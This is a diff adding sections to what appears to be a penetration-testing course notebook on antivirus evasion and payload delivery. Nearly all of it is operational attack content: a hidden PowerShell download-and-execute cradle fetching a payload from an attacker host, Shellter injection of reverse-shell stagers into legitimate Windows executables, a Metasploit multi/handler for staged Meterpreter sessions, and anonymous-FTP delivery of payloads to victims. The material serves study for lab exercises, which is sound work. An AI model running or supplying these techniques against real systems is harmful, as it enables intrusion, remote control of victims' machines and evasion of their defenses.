@@ -117,6 +117,130 @@ See [[Arctic|Arctic box writeup]] (`certutil` pulling down `nc.exe` and `JuicyPo
 
 ---
 
+## PowerShell In-Memory Injection (AV Bypass)
+
+Fetch and execute a PowerShell payload entirely in memory -- nothing writes to disk, bypasses AV on-access scanning.
+
+```bash
+# Kali: serve the payload script
+cd /path/to/payload/dir
+python3 -m http.server 80
+
+# Kali: nc listener (for stageless/plain PowerShell payloads)
+nc -nvlp <port>
+```
+```powershell
+# Victim: download-and-execute cradle, runs entirely in memory
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"
+```
+
+For Meterpreter or staged payloads instead of a plain nc shell, replace the nc listener above with msfconsole multi/handler (see the Staged Payload Handler section below).
+
+Flag breakdown: `-NoP` skips the startup profile (removes logging hooks), `-NonI` suppresses interactive prompts, `-W Hidden` hides the terminal window, `-Exec Bypass` overrides execution policy for this session only. Full teardown: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]].
+
+See [[Antivirus Evasion#15.3.2. PowerShell In-Memory Injection|15.3.2]], [[Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2 (.bat variant)]].
+
+#### Tags: #AntivirusEvasion #PowerShellInjection #IEX #DownloadCradle #InMemory
+
+---
+
+## Shellter PE Injection
+
+Inject a shellcode payload into a legitimate 32-bit Windows `.exe` so AV sees a known-good binary envelope.
+
+```bash
+# Prereq: install wine32 support (one-time, only needed on fresh Kali installs)
+sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32:i386
+
+# Reset Wine prefix to 32-bit (needed if Wine ran before wine32 was installed -- clears broken 64-bit prefix)
+rm -rf ~/.wine && WINEARCH=win32 wineboot
+
+# Verify your target PE is 32-bit (Shellter rejects PE32+ / 64-bit binaries)
+file <target.exe>   # must say "PE32 executable", not "PE32+"
+
+# Run Shellter
+shellter
+```
+
+Shellter interactive session (Auto mode, Stealth on, listed payload):
+```
+PE or operation mode: A                     # Auto mode
+PE target path: /path/to/target.exe         # the 32-bit PE to inject into (gets modified in place)
+Enable Stealth Mode? Y                      # preserves the original PE's execution flow post-payload
+Use listed payload or custom? L             # L for listed, not the payload index number
+Select payload by index: 1                  # 1 = Meterpreter_Reverse_TCP [stager], 5 = Shell_Reverse_TCP [stager]
+LHOST: <kali_ip>
+LPORT: <port>
+```
+
+If the payload menu label says `[stager]`, use the Staged Payload Handler below -- nc alone won't work.
+
+wine32 and prefix mechanics: [[Antivirus Evasion (Breakdowns)#Why Shellter needs wine32|Command Breakdowns]].
+
+See [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].
+
+#### Tags: #AntivirusEvasion #Shellter #PEInjection #Wine #Stealth
+
+---
+
+## Staged Payload Handler (msfconsole multi/handler)
+
+Required whenever the payload binary is a stager (indicated by `[stager]` in Shellter's menu, or slash notation like `windows/shell/reverse_tcp` in msfvenom). nc accepts the connection but can't serve the second stage.
+
+```bash
+msfconsole -q
+use multi/handler
+
+# For a staged shell (Shellter index 5, or msfvenom windows/shell/reverse_tcp)
+set PAYLOAD windows/shell/reverse_tcp
+
+# For staged Meterpreter (Shellter index 1, or msfvenom windows/meterpreter/reverse_tcp)
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+set LHOST <kali_ip>
+set LPORT <port>
+run
+```
+
+Slash (`windows/shell/reverse_tcp`) = staged, needs this handler. Underscore (`windows/shell_reverse_tcp`) = stageless, works with plain nc. Using the underscore variant in multi/handler against a stager binary gives "Session is not valid and will be closed."
+
+Staged vs stageless mechanics: [[Antivirus Evasion (Breakdowns)#Staged vs stageless payloads|Command Breakdowns]].
+
+See [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].
+
+#### Tags: #AntivirusEvasion #MultiHandler #StagedPayload #Meterpreter #Msfconsole
+
+---
+
+## FTP Active-Mode Payload Delivery
+
+When delivering a payload binary to a Windows victim via FTP (e.g. a victim box auto-executing any .exe dropped into its FTP root).
+
+```bash
+# Active mode (-A) is needed for many Windows FTP servers that don't support passive by default
+ftp -A <target_ip>
+
+# At the login prompts:
+# Username: anonymous        (type "anonymous" explicitly -- blank Enter gives 530 error)
+# Password: <any string>     (anonymous FTP typically accepts anything or blank)
+
+# In the FTP session:
+binary                        # switch to binary transfer mode (required for .exe/.bat -- ASCII mode corrupts them)
+put /local/path/payload.exe payload.exe   # always give an explicit remote filename
+                                          # without it, FTP sends the full local path as the remote name, which fails
+```
+
+Common gotchas:
+- Blank Enter at "Name:" gives `530 User cannot log in` -- type `anonymous` explicitly
+- `put /tmp/file.exe` alone gives `550 The system cannot find the path specified` because FTP uses the full local path `/tmp/file.exe` as the remote filename, which Windows rejects. Always `put <local> <remote>`.
+- Missing `binary` mode corrupts the binary -- the session will appear to succeed but the file won't execute
+
+See [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]], [[Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2]].
+
+#### Tags: #AntivirusEvasion #FTP #PayloadDelivery #ActiveMode
+
+---
+
 ## **Outstanding**
 This area grows alongside the modules. Whenever a new shell delivery mechanism comes up (Windows named-pipe shells, etc), add it here with a link back to the source section.
 
